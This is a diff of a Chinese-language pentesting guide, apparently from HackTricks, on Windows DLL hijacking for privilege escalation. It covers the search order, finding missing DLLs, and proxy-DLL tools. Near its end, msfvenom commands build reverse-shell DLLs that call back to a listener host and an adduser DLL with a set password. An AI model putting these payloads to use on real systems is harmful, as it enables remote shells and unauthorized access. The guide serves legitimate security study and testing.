@@ -4,7 +4,7 @@
 
 ## Basic Information
 
-DLL Hijacking 涉及操纵受信任的应用程序加载恶意 DLL。这个术语涵盖了几种战术，如 **DLL Spoofing, Injection, 和 Side-Loading**。它主要用于代码执行、实现持久性，以及较少见的权限提升。尽管这里重点关注提升，但劫持的方法在不同目标间保持一致。
+DLL Hijacking 涉及操纵受信任的应用程序加载恶意 DLL。这个术语包括几种战术，如 **DLL Spoofing, Injection, 和 Side-Loading**。它主要用于代码执行、实现持久性，以及较少见的特权升级。尽管这里重点关注升级，但劫持的方法在不同目标之间保持一致。
 
 ### Common Techniques
 
@@ -29,18 +29,18 @@ DLL Hijacking 涉及操纵受信任的应用程序加载恶意 DLL。这个术�
 
 ![](<../../../images/image (153).png>)
 
-如果您在寻找 **缺失的 DLL**，可以 **让它运行几秒钟**。\
-如果您在寻找 **特定可执行文件中的缺失 DLL**，则应设置 **另一个过滤器，如 "Process Name" "contains" "\<exec name>"，执行它，然后停止捕获事件**。
+如果您在寻找 **缺失的 DLL**，您可以 **让它运行几秒钟**。\
+如果您在寻找 **特定可执行文件中的缺失 DLL**，您应该设置 **另一个过滤器，如 "Process Name" "contains" "\<exec name>"，执行它，然后停止捕获事件**。
 
 ## Exploiting Missing Dlls
 
-为了提升权限，我们最好的机会是能够 **编写一个特权进程将尝试加载的 DLL**，在 **将要搜索的某个位置**。因此，我们将能够 **在一个文件夹中编写** DLL，该文件夹 **在搜索 DLL 之前**，或者我们将能够 **在某个文件夹中编写**，该文件夹 **将要搜索 DLL**，而原始 **DLL 在任何文件夹中都不存在**。
+为了提升特权，我们最好的机会是能够 **编写一个特权进程将尝试加载的 DLL**，在 **将要被搜索的某个位置**。因此，我们将能够 **在一个文件夹中编写** DLL，该文件夹 **在搜索 DLL 之前**，或者我们将能够 **在某个文件夹中编写**，该文件夹 **将要被搜索**，而原始 **DLL 在任何文件夹中都不存在**。
 
 ### Dll Search Order
 
 **在** [**Microsoft 文档**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中，您可以找到 DLL 的具体加载方式。**
 
-**Windows 应用程序** 按照一组 **预定义的搜索路径** 查找 DLL，遵循特定的顺序。当有害 DLL 被战略性地放置在这些目录之一时，DLL 劫持的问题就会出现，确保它在真实 DLL 之前被加载。防止这种情况的解决方案是确保应用程序在引用所需 DLL 时使用绝对路径。
+**Windows 应用程序** 按照一组 **预定义的搜索路径** 查找 DLL，遵循特定的顺序。当有害 DLL 被战略性地放置在这些目录中的一个时，DLL 劫持的问题就出现了，确保它在真实 DLL 之前被加载。防止这种情况的解决方案是确保应用程序在引用所需 DLL 时使用绝对路径。
 
 您可以在 32 位系统上看到 **DLL 搜索顺序**：
 
@@ -49,7 +49,7 @@ DLL Hijacking 涉及操纵受信任的应用程序加载恶意 DLL。这个术�
 3. 16 位系统目录。没有函数获取该目录的路径，但会进行搜索。 (_C:\Windows\System_)
 4. Windows 目录。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取该目录的路径。(_C:\Windows_)
 5. 当前目录。
-6. 在 PATH 环境变量中列出的目录。请注意，这不包括由 **App Paths** 注册表项指定的每个应用程序路径。在计算 DLL 搜索路径时不使用 **App Paths** 键。
+6. 在 PATH 环境变量中列出的目录。请注意，这不包括由 **App Paths** 注册表项指定的每个应用程序路径。计算 DLL 搜索路径时不使用 **App Paths** 键。
 
 这是 **启用 SafeDllSearchMode** 的 **默认** 搜索顺序。当禁用时，当前目录提升到第二位。要禁用此功能，请创建 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 注册表值并将其设置为 0（默认启用）。
 
@@ -71,11 +71,11 @@ Windows 文档中指出了标准 DLL 搜索顺序的某些例外：
 
 **Requirements**:
 
-- 确定一个在 **不同权限** 下运行或将要运行的进程（水平或横向移动），该进程 **缺少 DLL**。
-- 确保在 **DLL** 将被 **搜索的任何目录** 中有 **写入权限**。此位置可能是可执行文件的目录或系统路径中的目录。
+- 确定一个在 **不同特权** 下运行或将要运行的进程（水平或横向移动），该进程 **缺少 DLL**。
+- 确保在 **搜索 DLL** 的任何 **目录** 中有 **写入访问权限**。此位置可能是可执行文件的目录或系统路径中的目录。
 
 是的，要求很难找到，因为 **默认情况下，找到缺少 DLL 的特权可执行文件有点奇怪**，而且在系统路径文件夹中拥有写入权限更是 **奇怪**（默认情况下您无法做到）。但是，在配置错误的环境中，这是可能的。\
-如果您运气好，满足要求，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即使该项目的 **主要目标是绕过 UAC**，您也可能会在那里找到一个适用于您可以使用的 Windows 版本的 **DLL 劫持 PoC**（可能只需更改您有写入权限的文件夹路径）。
+如果您运气好，满足要求，您可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即使 **该项目的主要目标是绕过 UAC**，您也可能在那里找到适用于您可以使用的 Windows 版本的 **DLL 劫持 PoC**（可能只需更改您有写入权限的文件夹的路径）。
 
 请注意，您可以通过以下方式 **检查文件夹中的权限**：
 ```bash
@@ -100,11 +100,11 @@ writable-sys-path-+dll-hijacking-privesc.md
 ### 自动化工具
 
 [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)将检查您是否在系统PATH中的任何文件夹上具有写入权限。\
-其他发现此漏洞的有趣自动化工具是**PowerSploit函数**：_Find-ProcessDLLHijack_，_Find-PathDLLHijack_和_Write-HijackDll_。
+其他发现此漏洞的有趣自动化工具包括**PowerSploit函数**：_Find-ProcessDLLHijack_，_Find-PathDLLHijack_和_Write-HijackDll_。
 
 ### 示例
 
-如果您发现一个可利用的场景，成功利用它的最重要的事情之一是**创建一个导出至少所有可执行文件将从中导入的函数的dll**。无论如何，请注意，Dll劫持在[**从中等完整性级别提升到高完整性级别（绕过UAC）**](../../authentication-credentials-uac-and-efs/#uac)或从[**高完整性提升到SYSTEM**](../#from-high-integrity-to-system)**时非常有用。**您可以在这个专注于执行的dll劫持研究中找到**如何创建有效dll的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
+如果您发现一个可利用的场景，成功利用它的最重要的事情之一是**创建一个导出至少所有可执行文件将从中导入的函数的dll**。无论如何，请注意，Dll劫持在[**从中等完整性级别提升到高完整性（绕过UAC）**](../../authentication-credentials-uac-and-efs/index.html#uac)或[**从高完整性提升到SYSTEM**](../index.html#from-high-integrity-to-system)**时非常有用。**您可以在这个专注于执行的dll劫持研究中找到**如何创建有效dll**的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
 此外，在**下一节**中，您可以找到一些**基本dll代码**，这些代码可能作为**模板**或用于创建**导出非必需函数的dll**。
 
 ## **创建和编译Dll**
@@ -113,7 +113,7 @@ writable-sys-path-+dll-hijacking-privesc.md
 
 基本上，**Dll代理**是一个能够**在加载时执行您的恶意代码**的Dll，同时也能**暴露**并**按预期工作**，通过**将所有调用转发到真实库**。
 
-使用工具[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)或[**Spartacus**](https://github.com/Accenture/Spartacus)，您可以**指定一个可执行文件并选择要代理的库**，并**生成一个代理dll**，或**指定Dll并生成一个代理dll**。
+使用工具[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)或[**Spartacus**](https://github.com/Accenture/Spartacus)，您可以实际**指定一个可执行文件并选择要代理的库**，并**生成一个代理dll**，或**指定Dll并生成一个代理dll**。
 
 ### **Meterpreter**
 
@@ -125,7 +125,7 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**创建用户（x86 我没有看到 x64 版本）：**
+**创建用户（x86，我没有看到 x64 版本）：**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
